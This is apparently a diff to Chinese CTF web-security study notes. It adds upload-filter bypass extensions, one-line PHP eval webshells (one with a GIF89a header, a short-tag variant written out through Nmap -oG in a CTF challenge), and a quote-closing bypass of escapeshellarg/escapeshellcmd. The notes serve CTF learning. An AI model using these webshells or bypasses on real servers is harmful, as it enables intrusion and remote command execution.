@@ -94,7 +94,7 @@ ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722
 
 #### file函数
 
-![img](https://img-blog.csdnimg.cn/20210110135324804.png)
+![img](../images/20210110135324804.png)
 
 1.是格式
 2.是可选参数，有read和write，字面意思就是读和写
@@ -134,15 +134,45 @@ expect:// — 处理交互式的流
 
 ## 4.文件上传漏洞
 
-### 1.一句话木马
+### 1. 绕过思路
+
+```
+ASP：asa、cer、cdx
+
+ASPX：ashx、asmx、ascx、esms
+
+PHP：php4、php5、phtml
+
+JSP：jspx、jspf
+```
+
+## 2.一句话木马
 
  方便绕过开头可以加上GIF89a gif的文件头
 
-1. GIF89a
+1. ```
+   GIF89a
+   
+   <?php @eval($_POST[cmd]); ?>
+   ```
 
-<?php @eval($_POST[cmd]); ?>
+   
 
-2.<script language="php">@eval_r($_POST[cmd])</script>
+2. 
+
+<script language="php">@eval_r($_POST[cmd])</script>
+
+3.[网鼎杯 2020 朱雀组]Nmap 1
+
+Namp -oG将内容写入文件
+
+短标签<?php?> 可以用<?=?>代替
+
+```php
+<?= @eval($_POST[cmd]); ?> -oG a.phtml
+```
+
+
 
 然后蚁剑连接
 
@@ -781,6 +811,8 @@ function getFlag(){
 escapeshellarg 将字符串转码为可以在shell命令中使用的参数，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用
 
 escapeshellcmd对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。
+
+<font color=red>单引号绕过思路,可以在本地调试，思路就是加上单引号，与函数过滤后加上的单引号形成闭合</font>>
 
 - 传入的参数是：172.17.0.2<font color=red>**'**</font> -v -d a=1
 - 经过escapeshellarg处理后变成了<font color=pink>**'**</font>>172.17.0.2<font color=pink>**'**</font><font color=red>**\\'**</font><font color=blue>**'** </font>>-v -d a=1<font color=blue>**'**</font>>，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。
